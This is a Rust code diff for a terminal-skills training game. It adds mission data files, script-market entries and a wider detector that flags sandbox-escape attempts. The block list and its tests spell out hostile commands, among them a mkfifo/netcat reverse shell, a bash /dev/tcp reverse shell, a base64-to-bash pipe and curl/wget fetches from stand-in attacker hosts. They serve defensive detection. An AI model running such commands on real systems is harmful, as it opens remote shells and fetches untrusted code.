@@ -63,6 +63,9 @@ impl ShellState {
         let _ = vfs.mkdir_p("/", "logs", "system");
         let _ = vfs.mkdir_p("/", "missions", "system");
         let _ = vfs.mkdir_p("/", "home/player", "player");
+        let _ = vfs.mkdir_p("/", "data", "system");
+        let _ = vfs.mkdir_p("/", "data/reports", "system");
+        let _ = vfs.mkdir_p("/", "var/spool", "system");
 
         let _ = vfs.write_file(
             "/",
@@ -71,10 +74,161 @@ impl ShellState {
             false,
             "system",
         );
+
+        // Core log file used by training missions
         let _ = vfs.write_file(
             "/",
             "/logs/neon-gateway.log",
-            "[INFO] token=GLASS-AXON-13\n[WARN] sector drift\n[INFO] token=GLASS-AXON-13\n",
+            "[INFO] token=GLASS-AXON-13\n[WARN] sector drift\n[INFO] token=GLASS-AXON-13\n[ERROR] node=vault-sat-9 unreachable\n[INFO] token=GLASS-AXON-13\n[WARN] packet loss\n",
+            false,
+            "system",
+        );
+
+        // awk-patrol mission: structured data for field extraction
+        let _ = vfs.write_file(
+            "/",
+            "/data/node-registry.csv",
+            "node_id,sector,status,latency_ms\ncorp-sim-01,training,online,12\nneon-bazaar-gw,market,online,88\nghost-rail,transit,degraded,142\nvault-sat-9,secure,offline,0\ndark-mirror,redline,online,33\n",
+            false,
+            "system",
+        );
+
+        // chain-ops mission: conditional logic drill
+        let _ = vfs.write_file(
+            "/",
+            "/var/spool/tasks.txt",
+            "OPEN: deploy neon-proxy\nDONE: patch vault-sat-9\nOPEN: audit ghost-rail\nDONE: sweep dark-mirror\nOPEN: recover corp-sim-01\n",
+            false,
+            "system",
+        );
+
+        // sediment mission: stream editing log file
+        let _ = vfs.write_file(
+            "/",
+            "/logs/access.log",
+            "2026-03-07 22:01:03 ALLOW corp-sim-01 443\n2026-03-07 22:01:17 DENY ghost-rail 8080\n2026-03-07 22:02:44 ALLOW neon-bazaar-gw 443\n2026-03-07 22:03:01 DENY vault-sat-9 22\n2026-03-07 22:04:12 ALLOW dark-mirror 443\n",
+            false,
+            "system",
+        );
+
+        // Extra lore file for exploration
+        let _ = vfs.write_file(
+            "/",
+            "/data/reports/q1-summary.txt",
+            "// NEON GRID QUARTERLY REPORT Q1-2026\n// Classification: INTERNAL\nNode uptime: 94.2%\nIncidents: 3 (all ghost-rail sector)\nRevenue: 8,420,000 Neon Chips\nTop operative: ??? (alias redacted)\n",
+            false,
+            "system",
+        );
+
+        // cut-lab mission: tab-delimited inventory for field extraction
+        let _ = vfs.write_file(
+            "/",
+            "/data/inventory.tsv",
+            "item\tsku\tqty\tprice\nNeon Blade\tnb-001\t12\t450\nGhost Rail Pass\tgrp-002\t3\t1200\nVault Key\tvk-003\t1\t8800\nShadow Lens\tsl-004\t7\t320\nCyber Patch Kit\tcpk-005\t44\t80\n",
+            false,
+            "system",
+        );
+
+        // pattern-sweep mission: auth log with varied ACCEPT/REJECT events
+        let _ = vfs.write_file(
+            "/",
+            "/var/log/auth.log",
+            "2026-03-07 21:58:01 ACCEPT user=neo src=10.77.1.2\n2026-03-07 21:58:33 REJECT user=ghost src=10.77.9.9\n2026-03-07 21:59:00 ACCEPT user=neo src=10.77.1.2\n2026-03-07 21:59:12 ACCEPT user=rift src=10.77.3.7\n2026-03-07 21:59:44 REJECT user=shadow src=10.77.9.9\n2026-03-07 22:00:01 REJECT user=anon src=10.77.9.9\n",
+            false,
+            "system",
+        );
+
+        // Lore/environment files for new missions
+        let _ = vfs.write_file("/", "/etc/hostname", "corp-sim-01\n", false, "system");
+        let _ = vfs.write_file(
+            "/",
+            "/etc/hosts",
+            "127.0.0.1 localhost\n10.77.0.15 corp-sim-01\n10.77.1.2 neon-bazaar-gw\n10.77.3.7 ghost-rail\n",
+            false,
+            "system",
+        );
+        let _ = vfs.write_file(
+            "/",
+            "/var/log/syslog",
+            "2026-03-07 22:00:01 corp-sim-01 kernel: eth0 link up\n2026-03-07 22:00:05 corp-sim-01 sshd: Accepted publickey for neo\n2026-03-07 22:01:00 corp-sim-01 cron: running daily sweep\n2026-03-07 22:02:14 corp-sim-01 kernel: WARNING: vault-sat-9 unreachable\n",
+            false,
+            "system",
+        );
+        let _ = vfs.write_file(
+            "/",
+            "/home/player/notes.txt",
+            "# Operative Notes\nTarget: vault-sat-9\nStatus: offline\nNext step: check ghost-rail sector logs\nTip: use grep -i for case-insensitive search\n",
+            false,
+            "player",
+        );
+
+        // file-ops mission: a nested workspace directory to copy/move/remove
+        let _ = vfs.mkdir_p("/", "data/workspace", "system");
+        let _ = vfs.write_file(
+            "/",
+            "/data/workspace/config.txt",
+            "mode=stealth\ntimeout=30\nretries=3\n",
+            false,
+            "system",
+        );
+        let _ = vfs.write_file(
+            "/",
+            "/data/workspace/manifest.txt",
+            "version=2.1\nauthor=netrunner\ntarget=vault-sat-9\n",
+            false,
+            "system",
+        );
+
+        // regex-hunt mission: log with mixed patterns for grep -E exercises
+        let _ = vfs.write_file(
+            "/",
+            "/var/log/events.log",
+            "2026-03-07 22:10:01 ERROR user=neo code=ERR-001\n2026-03-07 22:10:14 WARN  user=rift code=WRN-007\n2026-03-07 22:11:00 INFO  user=neo code=INF-042\n2026-03-07 22:11:22 ERROR user=ghost code=ERR-002\n2026-03-07 22:12:05 FATAL user=shadow code=FAT-001\n2026-03-07 22:12:44 INFO  user=neo code=INF-099\n2026-03-07 22:13:01 WARN  user=anon code=WRN-003\n",
+            false,
+            "system",
+        );
+
+        // pipeline-pro mission: multi-column data requiring chained transforms
+        let _ = vfs.write_file(
+            "/",
+            "/data/pipeline.csv",
+            "id,name,score,rank\n101,neo,9800,1\n202,rift,8700,2\n303,shadow,7500,3\n404,ghost,6200,4\n505,anon,5100,5\n606,cipher,4300,6\n",
+            false,
+            "system",
+        );
+
+        // var-play mission: config file with KEY=value pairs to manipulate
+        let _ = vfs.write_file(
+            "/",
+            "/etc/sim-config",
+            "MODE=stealth\nTIMEOUT=30\nRETRIES=3\nTARGET=vault-sat-9\nDEBUG=false\nSECTOR=ghost-rail\n",
+            false,
+            "system",
+        );
+
+        // json-crack mission: JSON-like object with nested key-value data
+        let _ = vfs.write_file(
+            "/",
+            "/data/node-status.json",
+            "{\n  \"node\": \"vault-sat-9\",\n  \"status\": \"offline\",\n  \"sector\": \"secure\",\n  \"latency\": 0,\n  \"owner\": \"corp-admin\",\n  \"alert\": \"CRITICAL\"\n}\n",
+            false,
+            "system",
+        );
+
+        // seq-master mission: a list of task labels (player adds numbers via seq/nl)
+        let _ = vfs.write_file(
+            "/",
+            "/home/player/tasks.txt",
+            "deploy-proxy\nauditor-scan\nrecover-node\npatch-vault\nsweep-sector\n",
+            false,
+            "player",
+        );
+
+        // column-view mission: tab-delimited network status table
+        let _ = vfs.write_file(
+            "/",
+            "/data/netmap.tsv",
+            "NODE\tSECTOR\tSTATUS\tLATENCY\ncorp-sim-01\ttraining\tonline\t12ms\nneon-bazaar-gw\tmarket\tonline\t88ms\nghost-rail\ttransit\tdegraded\t142ms\nvault-sat-9\tsecure\toffline\t-\ndark-mirror\tredline\tonline\t33ms\n",
             false,
             "system",
         );
@@ -1106,6 +1260,12 @@ impl GameSession {
         out.push_str("  - Verify requirements: gate\n");
         out.push_str("  - Enter multiplayer: mode netcity\n");
         out.push('\n');
+        out.push_str("Advanced missions (post-NetCity)\n");
+        out.push_str("  - awk-patrol  : Extract fields from /data/node-registry.csv with awk\n");
+        out.push_str("  - chain-ops   : Use && and || to chain conditional commands\n");
+        out.push_str("  - sediment    : Edit /logs/access.log streams with sed\n");
+        out.push_str("  Each awards 20 reputation (vs 10 for starters).\n");
+        out.push('\n');
         out.push_str("Progression systems\n");
         out.push_str("  - Status and progression: status, missions, gate, events\n");
         out.push_str("  - Economy: shop list, auction list|sell|bid|buyout\n");
@@ -1526,7 +1686,7 @@ fn normalize_line_endings(input: &str) -> String {
 fn escape_attempt_reason(line: &str) -> Option<&'static str> {
     let lower = line.to_ascii_lowercase();
     let trimmed = lower.trim();
-    let checks: [(&str, &str); 9] = [
+    let checks: [(&str, &str); 20] = [
         ("std::process::command", "forbidden host process API probe"),
         (
             "tokio::process::command",
@@ -1539,6 +1699,17 @@ fn escape_attempt_reason(line: &str) -> Option<&'static str> {
         ("powershell.exe", "host shell invocation attempt"),
         ("pwsh -", "host shell invocation attempt"),
         ("cmd.exe /c", "host shell invocation attempt"),
+        ("/etc/shadow", "host shadow file probe"),
+        ("/etc/sudoers", "host privilege escalation probe"),
+        ("/etc/crontab", "host cron probe"),
+        ("/dev/mem", "host memory device probe"),
+        ("ld_preload", "dynamic linker injection probe"),
+        ("ld_library_path=/", "dynamic linker path injection probe"),
+        ("/proc/self", "host process self-probe"),
+        ("mkfifo", "named pipe reverse shell probe"),
+        ("base64 -d", "encoded payload execution probe"),
+        ("/dev/tcp/", "bash tcp redirect probe"),
+        ("/dev/udp/", "bash udp redirect probe"),
     ];
 
     for (needle, reason) in checks {
@@ -1585,10 +1756,14 @@ fn escape_attempt_reason(line: &str) -> Option<&'static str> {
             }
             "sudo" | "su" => return Some("privilege escalation attempt"),
             "docker" | "podman" => return Some("container breakout tooling probe"),
+            "nsenter" => return Some("namespace escape attempt"),
+            "chroot" => return Some("chroot escape attempt"),
             "systemctl" => return Some("host service control probe"),
             "nc" | "ncat" | "netcat" | "socat" => return Some("network pivot attempt"),
-            "nmap" => return Some("network scan attempt"),
-            "ssh" | "scp" | "sftp" | "telnet" | "ftp" => return Some("network pivot attempt"),
+            "nmap" | "masscan" | "zmap" => return Some("network scan attempt"),
+            "ssh" | "scp" | "sftp" | "telnet" | "ftp" | "rsh" | "rlogin" => {
+                return Some("network pivot attempt");
+            }
             "curl" | "wget" => {
                 if rest
                     .iter()
@@ -1656,6 +1831,56 @@ fn script_market() -> &'static [ScriptMarketEntry] {
             name: "warn-trace",
             description: "Trace warning signals in gateway logs",
             source: r#"let data = read_virtual("/logs/neon-gateway.log"); print(grep(data, "WARN"));"#,
+        },
+        ScriptMarketEntry {
+            name: "error-pulse",
+            description: "Surface ERROR entries from gateway logs",
+            source: r#"let data = read_virtual("/logs/neon-gateway.log"); print(grep(data, "ERROR"));"#,
+        },
+        ScriptMarketEntry {
+            name: "node-count",
+            description: "Count visible nodes in the current sector",
+            source: "let nodes = scan_nodes(); print(nodes.len);",
+        },
+        ScriptMarketEntry {
+            name: "auth-sweep",
+            description: "Count rejected auth attempts from auth log",
+            source: r#"let data = read_virtual("/var/log/auth.log"); print(grep(data, "REJECT"));"#,
+        },
+        ScriptMarketEntry {
+            name: "inventory-sku",
+            description: "Extract SKU field from the data inventory",
+            source: r#"let data = read_virtual("/data/inventory.tsv"); print(grep(data, "nb-"));"#,
+        },
+        ScriptMarketEntry {
+            name: "error-filter",
+            description: "Extract ERROR and FATAL lines from events log (regex-hunt)",
+            source: r#"let data = read_virtual("/var/log/events.log"); print(grep(data, "ERROR"));"#,
+        },
+        ScriptMarketEntry {
+            name: "top-score",
+            description: "Extract top-scorer name from pipeline.csv (pipeline-pro)",
+            source: r#"let data = read_virtual("/data/pipeline.csv"); print(grep(data, "neo"));"#,
+        },
+        ScriptMarketEntry {
+            name: "config-dump",
+            description: "Display current sim-config values (var-play)",
+            source: r#"let data = read_virtual("/etc/sim-config"); print(data);"#,
+        },
+        ScriptMarketEntry {
+            name: "json-keys",
+            description: "Extract key names from node-status.json (json-crack)",
+            source: r#"let data = read_virtual("/data/node-status.json"); print(grep(data, ":"));"#,
+        },
+        ScriptMarketEntry {
+            name: "seq-report",
+            description: "List numbered tasks from tasks.txt (seq-master)",
+            source: r#"let data = read_virtual("/home/player/tasks.txt"); print(data);"#,
+        },
+        ScriptMarketEntry {
+            name: "col-format",
+            description: "Format netmap.tsv as aligned table (column-view)",
+            source: r#"let data = read_virtual("/data/netmap.tsv"); print(data);"#,
         },
     ]
 }
@@ -1872,6 +2097,64 @@ mod tests {
         assert_eq!(escape_attempt_reason("cat /logs/neon-gateway.log"), None);
         assert_eq!(escape_attempt_reason("echo docker"), None);
         assert_eq!(escape_attempt_reason("chat global bash -c 'id'"), None);
+
+        // Extended pattern coverage
+        assert_eq!(
+            escape_attempt_reason("cat /etc/shadow"),
+            Some("host shadow file probe")
+        );
+        assert_eq!(
+            escape_attempt_reason("cat /etc/sudoers"),
+            Some("host privilege escalation probe")
+        );
+        assert_eq!(
+            escape_attempt_reason("LD_PRELOAD=/tmp/evil.so ls"),
+            Some("dynamic linker injection probe")
+        );
+        assert_eq!(
+            escape_attempt_reason("nmap -sV 10.0.0.1"),
+            Some("network scan attempt")
+        );
+        assert_eq!(
+            escape_attempt_reason("masscan --rate 1000 10.0.0.0/24"),
+            Some("network scan attempt")
+        );
+        assert_eq!(
+            escape_attempt_reason("rsh target-host"),
+            Some("network pivot attempt")
+        );
+        assert_eq!(
+            escape_attempt_reason("sudo su -"),
+            Some("privilege escalation attempt")
+        );
+        assert_eq!(
+            escape_attempt_reason("docker run --privileged alpine"),
+            Some("container breakout tooling probe")
+        );
+
+        // New pattern coverage
+        assert_eq!(
+            escape_attempt_reason("mkfifo /tmp/f; nc -e /bin/bash host 4444"),
+            Some("named pipe reverse shell probe")
+        );
+        assert_eq!(
+            escape_attempt_reason("echo dGVzdA== | base64 -d | bash"),
+            Some("encoded payload execution probe")
+        );
+        assert_eq!(
+            escape_attempt_reason("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
+            Some("bash tcp redirect probe")
+        );
+        assert_eq!(
+            escape_attempt_reason("curl https://evil.example.com/shell.sh"),
+            Some("external host/network call attempt")
+        );
+        assert_eq!(
+            escape_attempt_reason("wget http://attacker.example.org/payload"),
+            Some("external host/network call attempt")
+        );
+        assert_eq!(escape_attempt_reason("ls /logs"), None);
+        assert_eq!(escape_attempt_reason("cat /data/inventory.tsv"), None);
     }
 
     #[test]
